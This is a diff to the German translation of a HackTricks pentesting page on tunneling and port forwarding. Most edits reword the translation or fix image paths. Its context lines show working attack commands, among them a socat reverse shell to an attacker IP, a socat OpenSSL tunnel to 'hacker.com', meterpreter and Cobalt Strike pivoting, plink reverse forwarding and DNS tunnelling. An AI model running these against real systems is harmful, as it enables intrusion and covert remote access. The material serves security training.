@@ -4,7 +4,7 @@
 
 <summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
@@ -14,7 +14,7 @@
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -87,7 +87,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-Sie benötigen **Root-Zugriff auf beiden Geräten** (da Sie neue Schnittstellen erstellen werden) und die sshd-Konfiguration muss Root-Anmeldungen erlauben:\
+Sie benötigen **Root-Zugriff auf beiden Geräten** (da Sie neue Schnittstellen erstellen werden) und die sshd-Konfiguration muss Root-Login erlauben:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -97,7 +97,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Aktivieren Sie die Weiterleitung auf der Serverseite.
+Aktiviere das Weiterleiten auf der Serverseite.
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -130,7 +130,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) ist ein Internet-Protokoll, das zur Weiterleitung von Netzwerkverkehr zwischen einem Client und einem Server in einem Proxy-Server verwendet wird. Es ermöglicht dem Client, Verbindungen durch den Proxy zu anderen Servern zu tunneln. SOCKS kann verwendet werden, um den Datenverkehr zu anonymisieren oder auf Ressourcen zuzugreifen, die normalerweise nicht verfügbar sind.
+SOCKS (Socket Secure) ist ein Internet-Protokoll, das zur Weiterleitung von Netzwerkverkehr zwischen einem Client und einem Server in einem Proxy-Servernetzwerk verwendet wird. Es ermöglicht dem Client, Verbindungen über den Proxy-Server herzustellen, um auf Ressourcen im internen Netzwerk zuzugreifen, ohne direkt mit dem Server kommunizieren zu müssen. SOCKS bietet eine Möglichkeit, den Datenverkehr zu tunneln und Portweiterleitungen durchzuführen, um den Zugriff auf interne Ressourcen zu erleichtern.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -140,7 +140,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 ### Tunneling and Port Forwarding
 
-Tunneling is a method that allows data to be transferred securely over a public network. It involves encapsulating the data into another protocol to create a secure communication channel. Port forwarding, on the other hand, is a technique that redirects a communication request from one address and port number combination to another while the packets are in transit.
+Tunneling is a method that allows data to be transferred securely over a public network. It involves encapsulating the data into another protocol to create a secure communication channel. Port forwarding, on the other hand, is a technique that redirects a communication request from one address and port number combination to another while the data is in transit.
 
 #### Tunneling
 
@@ -150,7 +150,7 @@ Tunneling can be used to bypass firewalls and access restricted networks. It can
 
 Port forwarding is commonly used in NAT environments to allow external devices to access services on private networks. It can also be used to redirect traffic from one port to another, useful for accessing services on non-standard ports.
 
-Both tunneling and port forwarding are essential techniques in the field of cybersecurity, allowing for secure communication and access to restricted resources.
+Both tunneling and port forwarding are essential techniques in networking and cybersecurity, providing ways to securely access and transfer data across different networks.
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -187,7 +187,7 @@ rportfwd stop [bind port]
 ### rPort2Port lokal
 
 {% hint style="warning" %}
-In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team-Server, und der **Datenverkehr wird an den Cobalt Strike-Client gesendet** (nicht an den Team-Server) und von dort aus an den angegebenen Host:Port.
+In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team-Server, und der **Datenverkehr wird an den Cobalt Strike-Client** (nicht an den Team-Server) gesendet und von dort aus zum angegebenen Host:Port.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -204,7 +204,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Meißel
 
 Sie können es von der Veröffentlichungsseite von [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) herunterladen.\
-Sie müssen die **gleiche Version für Client und Server verwenden**
+Sie müssen die **gleiche Version für Client und Server** verwenden
 
 ### Socken
 ```bash
@@ -257,7 +257,9 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ### Port2Port
 
-### Port2Port
+#### Tunneling und Portweiterleitung
+
+Portweiterleitung ist eine Technik, bei der Datenverkehr von einem Port zu einem anderen umgeleitet wird. Tunneling bezieht sich auf die Weiterleitung eines gesamten Netzwerkprotokolls über eine andere Verbindung. Beide Techniken sind nützlich, um den Datenverkehr zu verschleiern und auf interne Ressourcen zuzugreifen.
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
@@ -275,7 +277,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Du kannst einen **nicht authentifizierten Proxy** umgehen, indem du diese Zeile anstelle der letzten in der Konsole des Opfers ausführst:
+Sie können einen **nicht authentifizierten Proxy** umgehen, indem Sie diese Zeile anstelle der letzten in der Konsole des Opfers ausführen:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -301,7 +303,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Verbinde den lokalen SSH-Port (22) mit dem 443-Port des Angreifer-Hosts
+Verbinden Sie den lokalen SSH-Port (22) mit dem 443-Port des Angreiferhosts
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -309,9 +311,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Es ist wie eine Konsolenversion von PuTTY (die Optionen ähneln sehr einem SSH-Client).
+Es ist wie eine Konsolenversion von PuTTY (die Optionen sind sehr ähnlich zu einem ssh-Client).
 
-Da dieses Binärfile auf dem Opfer ausgeführt wird und es sich um einen SSH-Client handelt, müssen wir unseren SSH-Dienst und Port öffnen, damit wir eine umgekehrte Verbindung herstellen können. Anschließend leiten wir nur lokal zugängliche Ports zu einem Port auf unserer Maschine weiter:
+Da dieses Binärfile auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und Port öffnen, damit wir eine umgekehrte Verbindung haben können. Anschließend leiten wir nur lokal zugängliche Ports zu einem Port auf unserer Maschine weiter:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -343,9 +345,9 @@ Laden Sie auf Ihrem Client-Computer **`SocksOverRDP-Plugin.dll`** wie folgt:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Jetzt können wir uns über **RDP** mit dem **Opfer** verbinden, indem wir **`mstsc.exe`** verwenden, und wir sollten eine **Aufforderung** erhalten, die besagt, dass das **SocksOverRDP-Plugin aktiviert** ist und auf **127.0.0.1:1080** **hört**.
+Jetzt können wir uns über RDP mit dem Opfer verbinden, indem wir `mstsc.exe` verwenden, und wir sollten eine Aufforderung erhalten, dass das SocksOverRDP-Plugin aktiviert ist und auf `127.0.0.1:1080` lauscht.
 
-**Verbinden** Sie sich über **RDP** und laden Sie die `SocksOverRDP-Server.exe`-Binärdatei auf die Opfermaschine hoch und führen Sie sie aus:
+Verbinden Sie sich über RDP und laden Sie die `SocksOverRDP-Server.exe`-Binärdatei auf die Opfermaschine hoch und führen Sie sie aus:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -381,7 +383,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Jetzt, wenn Sie zum Beispiel den **SSH**-Dienst beim Opfer einstellen, um auf Port 443 zuzuhören. Sie können sich über den Angreiferport 2222 damit verbinden.\
+Jetzt, wenn Sie zum Beispiel den **SSH**-Dienst beim Opfer einstellen, um auf Port 443 zu lauschen. Sie können sich über den Angreiferport 2222 damit verbinden.\
 Sie könnten auch einen **Meterpreter** verwenden, der sich mit localhost:443 verbindet und der Angreifer auf Port 2222 lauscht.
 
 ## YARP
@@ -394,7 +396,7 @@ Ein von Microsoft erstellter Reverse-Proxy. Sie finden ihn hier: [https://github
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root wird in beiden Systemen benötigt, um Tun-Adapter zu erstellen und Daten zwischen ihnen mithilfe von DNS-Abfragen zu tunneln.
+Root ist in beiden Systemen erforderlich, um Tun-Adapter zu erstellen und Daten zwischen ihnen mithilfe von DNS-Abfragen zu tunneln.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -469,7 +471,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 **[ngrok](https://ngrok.com/) ist ein Tool, um Lösungen mit einem Befehl ins Internet zu bringen.**
-*Expositions-URIs sehen so aus:* **UID.ngrok.io**
+*Expositions-URIs sind wie:* **UID.ngrok.io**
 
 ### Installation
 
@@ -504,6 +506,8 @@ chmod a+x ./ngrok
 
 *Nützlich für XSS, SSRF, SSTI ...*
 Direkt von stdout oder im HTTP-Interface [http://127.0.0.1:4040](http://127.0.0.1:4000).
+
+#### Tunneling interner HTTP-Dienste
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -534,7 +538,7 @@ addr: file:///tmp/httpbin/
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -548,6 +552,6 @@ addr: file:///tmp/httpbin/
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und das [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.
 
 </details>
